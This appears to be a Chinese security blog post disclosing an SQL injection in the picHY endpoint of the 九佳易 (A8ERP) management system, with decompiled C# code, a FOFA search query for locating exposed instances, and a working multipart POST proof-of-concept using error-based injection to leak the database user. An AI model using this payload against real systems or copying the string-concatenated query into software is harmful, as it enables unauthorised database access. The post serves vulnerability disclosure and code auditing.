---
title: "九佳易管理系统 picHY.ashx SQL 注入漏洞"
source: https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html
asset_dir: assets/九佳易管理系统-pichy.ashx-sql-注入漏洞
---

# 九佳易管理系统 picHY.ashx SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/27 08:31
- 285浏览
- [0评论](#comment)
- 20分钟阅读

---

# 漏洞简介

九佳易管理系统中的 picHY.ashx 通用处理程序接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，该接口主要用于处理前端 AJAX 请求并与后端数据库进行交互。由于接口未对客户端传入的关键参数进行严格的输入校验、参数化处理或特殊字符转义，攻击者可通过构造恶意的 SQL 语句片段注入到请求参数中，使后端数据库执行非授权的 SQL 操作，进而窃取、篡改甚至销毁数据库中的敏感数据。

SQL注入防护

# 影响版本

# fofa语法

> title="VSQL" && body="/Scripts/Login\_A8/"

# 漏洞分析

根据 picHY.ashx 的代码引用

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="picHY.aspx.cs" Inherits="A8ERP.HuiYuan.HuiYuanDangAn.picHY" %>
```

找到 A8ERP.HuiYuan.HuiYuanDangAn.picHY 相关类的实现逻辑

代码安全审计

```
using System;
using System.Collections.Generic;
using System.Data;
using System.Web.UI;
using System.Web.UI.HtmlControls;

#nullable disable
namespace A8ERP.HuiYuan.HuiYuanDangAn;

public class picHY : Page
{
  protected HtmlHead Head1;
  public List<string> piclist = new List<string>();
  public int picCount;

  protected void Page_Load(object sender, EventArgs e)
  {
    string str = this.Request["hyh"];
    DBHelp dbHelp = new DBHelp();
    dbHelp.Open();
    string sql = $"SELECT top 1 default_disp FROM da_hy_pic   where  hyh='{str}'";
    DataTable dataTable = dbHelp.QueryRDataTable(sql);
    this.picCount = ((InternalDataCollectionBase) dataTable.Rows).Count;
    if (this.picCount <= 0)
    {
      this.piclist.Insert(0, "http://localhost:1130/SPPics/HY/jjy.jpg");
    }
    else
    {
      for (int index = 0; index < this.picCount; ++index)
        this.piclist.Insert(index, dataTable.Rows[index][0].ToString());
    }
    dbHelp.Close();
  }
}
```

非常明显拼接导致的SQL注入，参数`string str = this.Request["hyh"];`无任何过滤或校验被直接拼接到`$"SELECT top 1 default_disp FROM da_hy_pic where hyh='{str}'"`sql语句中，然后调用`dbHelp.QueryRDataTable()`方法进行执行，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

> 因为参数获取是通过`this.Request["hyh"]`的方式，因此支持get、post等常规方式外，还支持multipart格式
>
> 漏洞修复方案

```
POST /HuiYuan/HuiYuanDangAn/picHY.aspx HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Host: a8erp.mrxn.net

------WebKitFormBoundary
Content-Disposition: form-data; name="hyh"

'-1/user--
------WebKitFormBoundary--
```

[![九佳易管理系统 picHY.ashx SQL 注入漏洞](images/img-001-abcd5e3185e8.webp)](https://image.mrxn.net/481649191cb140528b3f2b93c74b44a2.webp)

成功利用报错注入在响应回显当前数据库用户信息

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
